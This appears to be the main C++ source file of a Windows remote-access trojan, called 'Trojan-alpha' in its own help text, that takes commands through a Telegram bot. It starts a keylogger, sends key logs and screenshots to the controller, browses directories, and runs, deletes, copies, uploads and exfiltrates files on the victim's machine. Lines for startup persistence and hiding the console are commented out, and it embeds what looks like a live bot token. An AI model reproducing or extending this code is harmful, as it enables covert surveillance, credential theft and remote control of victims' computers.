#include <iostream>
#include <tgbot/tgbot.h>
#include <filesystem>

#include "keyLogger.h"
#include "globals.h"
#include "console.h"
#include "startup.h"
#include "conversions.h"
#include "screenshot.h"
#include "modes.h"
#include "handle_result.h"


void executeIfStandardMode(TgBot::Bot& bot, TgBot::Message::Ptr message, std::function<void(int64_t)> command) {
	if (currentMode == Mode::STANDARD) {
		int64_t chat_id = message->chat->id;
		command(chat_id);
	}
	else {
		bot.getApi().sendMessage(message->chat->id, "You need first to exit your current mode.");
	}
}


// Main function
void startBot(std::string token)
{
	using namespace std;
	namespace fs = std::filesystem;

	TgBot::Bot bot(token);


	bot.getEvents().onCommand("start", [&bot](TgBot::Message::Ptr message) {

		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			ostringstream commands;
			commands << "Hello, welcome to Trojan-alpha. Here's the commands you can use:\n"
				<< "/start_key_logger - starts key logger;\n"
				<< "/kill_key_logger - kills key logger;\n"
				<< "/send_scr - makes and sends screenshot;\n"
				<< "/send_key_logger - sends a file with key logs;\n"
				<< "/check_dir_mode - opens check directory mode;\n"
				<< "/full_check_dir_mode - opens full check directory mode;\n"
				<< "/start_file_mode - opens start file mode;\n"
				<< "/delete_file_mode - opens delete file mode;\n"
				<< "/copy_file_mode - opens copy file mode;\n"
				<< "/send_file_mode - opens send file mode;\n"
				<< "/upload_file_mode - opens upload file mode;\n"
				<< "/play_music_mode - opens play music mode;\n"
				<< "/stop_music - stops music;\n"
				<< "/exit_mode - exits your current mode.\n";

			bot.getApi().sendMessage(message->chat->id, commands.str());
			bot.getApi().sendMessage(message->chat->id, string("ChatID: ") + to_string(message->chat->id));
			});
		});


	bot.getEvents().onCommand("start_key_logger", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Starting Key Logger.");
			isKeyLoggerRunning = true;

			thread keyLogger(startKeyLogger, ref(bot), chat_id);
			keyLogger.detach();
			});
		});


	bot.getEvents().onCommand("kill_key_logger", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			isKeyLoggerRunning = false;
			bot.getApi().sendMessage(chat_id, "Killing current key_logger session.");
			Result result = deleteFile(klFilename);
			handleResult(result, bot, chat_id);
			});
		});


	bot.getEvents().onCommand("send_key_logger", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			Result result = sendFile(bot, klFilename, chat_id);
			handleResult(result, bot, chat_id);
			});
		});


	bot.getEvents().onCommand("send_scr", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			try {
				char tempPath[MAX_PATH];
				GetTempPathA(MAX_PATH, tempPath);
				string tempFile = string(tempPath) + "scrtemp.bmp";
				takeScreenshot(tempFile);
				Result result = sendFile(bot, tempFile, chat_id);
				handleResult(result, bot, chat_id);
				result = deleteFile(tempFile);
				handleResult(result, bot, chat_id);
			}
			catch (const std::exception& e) {
				bot.getApi().sendMessage(chat_id, string("Error: ") + e.what());
			}
			});
		});


	bot.getEvents().onCommand("check_dir_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Send a path of directory you want to check.");
			currentMode = Mode::CHECK_DIR;
			});
		});


	bot.getEvents().onCommand("full_check_dir_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Send a path of directory you want to check.");
			currentMode = Mode::FULL_CHECK_DIR;
			});
		});


	bot.getEvents().onCommand("start_file_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to start.");
			currentMode = Mode::START_FILE;
			});
		});


	bot.getEvents().onCommand("delete_file_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to delete.");
			currentMode = Mode::DELETE_FILE;
			});
		});


	bot.getEvents().onCommand("copy_file_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to copy.");
			currentMode = Mode::COPY_FILE;
			});
		});


	bot.getEvents().onCommand("send_file_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Send a path of a file you want to download.");
			currentMode = Mode::SEND_FILE;
			});
		});


	bot.getEvents().onCommand("upload_file_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Send a file you want to upload.");
			currentMode = Mode::UPLOAD_FILE;
			isWaitingForFile = true;
			});
		});


	bot.getEvents().onCommand("play_music_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			bot.getApi().sendMessage(chat_id, "Send a path to mp3 you want to play.");
			currentMode = Mode::PLAY_MUSIC;
			});
		});


	/*bot.getEvents().onCommand("conversation_mode", [&bot](TgBot::Message::Ptr message) {
		executeIfStandardMode(bot, message, [&](int64_t chat_id) {
			ShowConsole();
			isConversationRunning = true;
			thread listenThread(listenMode, ref(bot), chat_id);
			listenThread.detach();
			currentMode = Mode::CONVERSATION;
			});
		});*/


	// ALL messages from the user are processed here FIRST.
	bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {

		if (!message) {
			bot.getApi().sendMessage(message->chat->id, "Invalid input: empty or null message.");
			return;
		}

		// These commands are here for easement.
		else if (message->text == "/exit_mode") {
			if (currentMode == Mode::STANDARD) {
				bot.getApi().sendMessage(message->chat->id, "Your current mode is already STANDARD.");
				return;
			}
			bot.getApi().sendMessage(message->chat->id, "Exiting your current mode.");
			currentMode = Mode::STANDARD;
			isConversationRunning = false;
			return;
		}


		else if (message->text == "/stop_music") {
			if (isMusicPlaying)
			{
				try {
					mciSendString(L"close myMP3", NULL, 0, NULL);
					bot.getApi().sendMessage(message->chat->id, "Music has been successfully stopped.");
				}
				catch (const std::exception& e) {
					bot.getApi().sendMessage(message->chat->id, string("Error: ") + e.what());
				}
			}
			else
				bot.getApi().sendMessage(message->chat->id, "Music is not playing right now.");
			return;
		}


		Result result = {COE::Success, "", ResponseType::None, ""}; // default value
		switch (currentMode) 
		{
		case Mode::CHECK_DIR:
			result = checkDir(message->text);
			break;
		case Mode::FULL_CHECK_DIR:
			result = fullCheckDir(message->text);
			break;
		case Mode::START_FILE:
			result = startFile(message->text);
			break;
		case Mode::DELETE_FILE:
			result = deleteFile(message->text);
			break;
		case Mode::COPY_FILE:
			result = copyFile(message->text);
			break;
		case Mode::SEND_FILE:
			result = sendFile(bot, message->text, message->chat->id);
			break;
		case Mode::UPLOAD_FILE:
			result = uploadFile(bot, message);
			break;
		case Mode::PLAY_MUSIC:
			result = playMusic(message->text);
			break;
		}
		handleResult(result, bot, message->chat->id);
		});


	try {
		printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
		bot.getApi().sendMessage(sashaId, "TgBot has been launched.");

		TgBot::TgLongPoll longPoll(bot);

		while (true) {
			longPoll.start();
			std::this_thread::sleep_for(std::chrono::milliseconds(100)); // Reduces CPU usageы
		}
	}
	catch (TgBot::TgException& e) {
		printf("error: %s\n", e.what());
	}
}


int main()
{
	setlocale(LC_ALL, "Russian");
	//HideConsole();

	//AddToStartup(L"System", L"path\\to\\your\\program.exe");

	startBot("6507971490:AAEFE5H4m1KJvJwUXFDgM4cVHSSwTXx0uiU");

	return 0;
}
